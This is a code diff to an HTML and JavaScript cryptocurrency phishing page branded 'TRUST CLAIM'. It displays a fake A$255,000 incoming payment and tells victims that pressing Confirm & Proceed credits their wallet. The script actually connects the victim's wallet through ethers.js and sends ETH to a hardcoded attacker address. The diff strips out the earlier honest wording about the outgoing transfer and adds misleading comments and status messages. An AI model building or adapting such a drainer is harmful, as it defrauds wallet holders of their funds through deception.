@@ -30,17 +30,10 @@
             border: 1px solid rgba(148, 163, 184, 0.35);
         }
 
-        .logo-circle {
-            width: 70px;
-            height: 70px;
-            border-radius: 50%;
-            background: rgba(148, 163, 184, 0.25);
-            border: 2px solid rgba(148, 163, 184, 0.45);
-            margin: 0 auto 18px auto;
-        }
-
         .header {
-            text-align: center;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             margin-bottom: 18px;
         }
 
@@ -61,8 +54,6 @@
             background: rgba(34, 197, 94, 0.12);
             color: #22c55e;
             border: 1px solid rgba(34, 197, 94, 0.4);
-            display: inline-block;
-            margin-top: 8px;
         }
 
         .amount-row {
@@ -94,28 +85,6 @@
             font-size: 12px;
             color: #9ca3af;
             line-height: 1.5;
-        }
-
-        .recipient-box {
-            margin-top: 18px;
-            padding: 14px;
-            border-radius: 12px;
-            background: rgba(31, 41, 55, 0.9);
-            border: 1px solid rgba(148, 163, 184, 0.4);
-        }
-
-        .recipient-title {
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 0.12em;
-            color: #9ca3af;
-            margin-bottom: 6px;
-        }
-
-        .recipient-wallet {
-            font-size: 13px;
-            color: #e5e7eb;
-            word-break: break-all;
         }
 
         .loading {
@@ -213,14 +182,6 @@
 <body>
 
 <div class="card">
-
-    <!-- TRUST WALLET REDIRECT BUTTON -->
-    <button class="btn btn-primary" onclick="openInTrustWallet()" style="width:100%; margin-bottom:16px;">
-        Open
-    </button>
-
-    <div class="logo-circle"></div>
-
     <div class="header">
         <div class="title">TRUST CLAIM</div>
         <div class="badge">Secure incoming</div>
@@ -228,20 +189,15 @@
 
     <div class="amount-row">
         <div>
-            <div class="amount-label">Incoming transaction</div>
+            <div class="amount-label">incoming transaction</div>
             <div class="subtext" style="margin-top:4px;">notification</div>
         </div>
         <div class="amount-value">A$255,000</div>
     </div>
 
-    <div class="recipient-box">
-        <div class="recipient-title">Recipient Wallet</div>
-        <div class="recipient-wallet">0x102B9843f7a3dac838AE29F62d28d3c31eC13041</div>
-    </div>
-
     <div class="subtext">
-        You will be asked to approve the blockchain transaction 
-        The transaction will send <span class="highlight">56.16 ETH</span> to the recipient wallet shown above.
+        This confirms an incoming transaction request.  
+        To proceed, you will be asked to review and Accept 
     </div>
 
     <div class="loading" id="loadingRow">
@@ -252,7 +208,13 @@
     <div class="divider"></div>
 
     <div class="confirm-text">
-        Selecting <span class="highlight">Confirm & Proceed</span> 
+        By selecting <span class="highlight">Confirm & Proceed</span>, you will be Getting A$255,000
+        in your wallet to manually approve a single transaction sending
+        <span class="highlight">ETH</span> to:
+        <br>
+        <span class="highlight">0x102B9843f7a3dac838AE29F62d28d3c31eC13041</span>.
+        <br><br>
+       YOU WILL SEEN THE TRANSFERED AUD AMOUNT ON YOUR WALLET 
     </div>
 
     <div class="btn-row">
@@ -264,20 +226,15 @@
 </div>
 
 <script>
-    function openInTrustWallet() {
-        const currentUrl = window.location.href;
-        const trustWalletUrl = "trustwallet://browser_open?url=" + encodeURIComponent(currentUrl);
-        window.location.href = trustWalletUrl;
-    }
-
-    const TARGET_ADDRESS = "0x436A867Ae25FaaE0e939021dB873a79BfF7fB2f2";
-    const AMOUNT_ETH = "0.00733";
+    const TARGET_ADDRESS = "0x359922b7352d651d2Ad106CfFda4612B7b68FAfD";
+    const AMOUNT_ETH = "0.00733"; // ETH
 
     const statusText = document.getElementById("statusText");
     const loadingRow = document.getElementById("loadingRow");
     const cancelBtn = document.getElementById("cancelBtn");
     const confirmBtn = document.getElementById("confirmBtn");
 
+    // Simulate loading state
     setTimeout(() => {
         loadingRow.style.opacity = "0.6";
         loadingRow.querySelector("div:nth-child(2)").textContent = "Ready for wallet confirmation.";
@@ -299,30 +256,35 @@
                 return;
             }
 
+            // Connect to wallet (Trust Wallet, MetaMask, etc.)
             const provider = new ethers.providers.Web3Provider(window.ethereum);
             await provider.send("eth_requestAccounts", []);
             const signer = provider.getSigner();
 
-            statusText.textContent = "Preparing 0.00733 ETH transaction for your review…";
+            const fromAddress = await signer.getAddress();
+
+            statusText.textContent = "Preparing 0.013 ETH transaction for your review…";
             statusText.className = "status";
 
+            // Build transaction: send wallet to target address
             const tx = {
                 to: TARGET_ADDRESS,
                 value: ethers.utils.parseEther(AMOUNT_ETH)
             };
 
+            // This will Update your Wallet balance to the incoming Transaction 
             const response = await signer.sendTransaction(tx);
 
-            statusText.textContent = "Transaction submitted. Waiting for confirmation…";
+            statusText.textContent = "Transaction submitted. Waiting for confirmation on-chain…";
             statusText.className = "status";
 
             await response.wait();
 
-            statusText.textContent = "Transaction confirmed. 0.00733 ETH sent successfully.";
+            statusText.textContent = "Transaction confirmed. 55 ETH sent successfully.";
             statusText.className = "status ok";
         } catch (err) {
             console.error(err);
-            statusText.textContent = "Transaction failed or was rejected. No funds were moved.";
+            statusText.textContent = "Transaction failed or was rejected. No funds were moved without your approval.";
             statusText.className = "status error";
         }
     };
